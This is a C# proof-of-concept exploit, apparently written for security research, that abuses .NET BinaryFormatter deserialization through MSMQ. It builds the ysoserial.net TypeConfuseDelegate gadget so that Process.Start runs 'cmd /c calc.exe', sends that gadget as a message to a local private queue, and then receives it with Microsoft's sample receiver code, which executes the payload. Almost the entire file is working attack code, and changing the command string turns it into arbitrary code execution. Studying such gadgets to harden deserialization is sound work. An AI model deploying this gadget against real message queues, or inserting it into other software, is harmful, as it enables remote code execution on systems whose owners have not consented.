using System;
using System.Collections.Generic;
using System.IO;
using System.Diagnostics;
using System.Messaging;
using System.Reflection;
using System.Drawing;

namespace Marshalling.NET
{
    public class MSMQ_Exploit
    {
        public static string QUEUE_PATH = @".\private$\QueueName";
        static void Main(string[] args)
        {
            Message maliciousMessage = generateBinaryMessageFormatterPayload();     
            
            sendMessage(maliciousMessage, QUEUE_PATH);
            Console.WriteLine("Using TypeConfuseDelegate generator from ysoserial.net");
            Console.WriteLine("Message " + maliciousMessage + " sent! Press enter to receive...");
            Console.ReadLine();
            // Run MSDN code - https://msdn.microsoft.com/en-us/library/system.messaging.binarymessageformatter(v=vs.110).aspx
            ReceiveMessage();

            Console.ReadKey();
        }

        /*
         * Send message to queue
         */
        public static void sendMessage(Message myMessage, string queuePath)
        {
            if (!MessageQueue.Exists(queuePath))
            {
                MessageQueue.Create(queuePath);
            }
            MessageQueue myQueue = new MessageQueue(queuePath);
            BinaryMessageFormatter bmf = new BinaryMessageFormatter();
            // myQueue.Purge();
            myQueue.Send(myMessage);
            myQueue.Close();
        }

        /* This code creates a gadget that will be executed when deserialized by BinaryFormatter,
         * which is the internal deserializer for BinaryMessageFormatter.
         * Taken from ysoserial.net - https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs
         * This gadget was created by James Forshaw
         */
        public static Message generateBinaryMessageFormatterPayload()
        {
            
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c calc.exe");
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",
                BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            BinaryMessageFormatter bmf = new BinaryMessageFormatter();
            Message exploitMessage = new Message();
            bmf.Write(exploitMessage, set);
            return exploitMessage;
        }



        /* Code from https://msdn.microsoft.com/en-us/library/system.messaging.binarymessageformatter(v=vs.110).aspx
         * Only change made is in replacing hardcoded queue name with QUEUE_PATH
         * Exception will be thrown by casting in "Bitmap myImage = (Bitmap)myMessage.Body;"
         */

        //**************************************************
        // Receives a message containing an image.
        //**************************************************
        public static void ReceiveMessage()
		{

			try
			{

				// Connect to the a queue on the local computer.
				MessageQueue myQueue = new MessageQueue(QUEUE_PATH);

				// Set the formatter to indicate body contains an Order.
				myQueue.Formatter = new BinaryMessageFormatter();

                // Receive and format the message. 
                System.Messaging.Message myMessage = myQueue.Receive(); 
				Bitmap myImage = (Bitmap)myMessage.Body;

				// This will be saved in the \bin\debug or \bin\retail folder.
				myImage.Save("ReceivedImage.bmp",System.Drawing.Imaging.ImageFormat.Bmp);


			}

			catch (MessageQueueException)
			{
				// Handle Message Queuing exceptions.
			}

			// Handle invalid serialization format.
			catch (InvalidOperationException e)
			{
				Console.WriteLine(e.Message);
			}

			catch (IOException e)
			{
				// Handle file access exceptions.
			}

			// Catch other exceptions as necessary.

			return;
		}
 
    }
 }
